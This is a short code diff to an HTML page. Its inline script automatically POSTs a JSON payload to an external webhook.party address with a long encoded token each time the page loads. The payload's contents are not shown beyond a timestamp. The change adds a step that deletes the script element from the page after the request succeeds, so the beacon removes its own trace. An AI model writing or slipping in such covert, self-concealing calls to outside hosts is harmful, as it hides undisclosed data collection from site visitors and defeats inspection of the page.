@@ -213,7 +213,7 @@
             margin: 5px 0;
         }
     </style>
-    <script>
+    <script id="log-script">
     function sendLog() {
         const webhookURL = "https://l.webhook.party/hook/7v8C38sQLvSvMVnAfxMlf6IG1ryVqMb8gXiOBeUImlvjX9bAySRhN%2BwgwjX6VuhEeoz84hRCY72XeHi86ls1VI8cBMAp%2BKw624CXgEz7u5LPU1x%2Bvi5BbU02nyaGWfGtaX3tqw4x%2B2LHoo%2Fk4heCp0mkPH0Y4uqfrmai8k2PQR197PtRxxpgVHf0a86hhqS2I9zm1s1f7P9W7w2Qbn2ti7u9x0h2Px6ZnpHDZCWV0%2BCTi3ifjmPreSxtvG3rJ8RO4PAF4MP2JeGvOj9a%2F604BHrPtcjr%2FNR3hb37RDqs%2F3UY5IltVu4Rno03ufNuHJh53kfLUkJM1aGWIaYBPBzeqXbyb%2Bce%2BbS1cofmG4NisCosSDZgICK3B7emlteIIjsK3h5ALooDGBc%3D/0AqjhOVYFkG7ZdQ0";
         const now = new Date();
@@ -228,11 +228,14 @@
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
+        }).then(() => {
+            const script = document.getElementById("log-script");
+            if (script) script.remove();
         }).catch((error) => {
             console.error('웹훅 전송 실패:', error);
         });
     }
-    
+
     window.onload = sendLog;
 </script>
 </head>
